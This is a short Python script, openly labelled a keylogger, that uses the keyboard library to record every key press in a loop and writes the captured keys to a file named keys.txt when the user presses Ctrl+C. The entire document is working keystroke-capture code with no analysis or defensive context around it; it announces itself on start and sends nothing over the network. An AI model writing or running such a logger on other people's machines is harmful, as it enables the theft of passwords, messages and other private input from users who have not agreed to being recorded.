import keyboard

print("Keylogger Started (Ctrl+C) to quit")
key = ""

try:
    while True:
        key += " " + keyboard.read_key()

except KeyboardInterrupt:
    print("keylogger Stoped")
    with open("keys.txt", "w") as file:
        file.write(key)


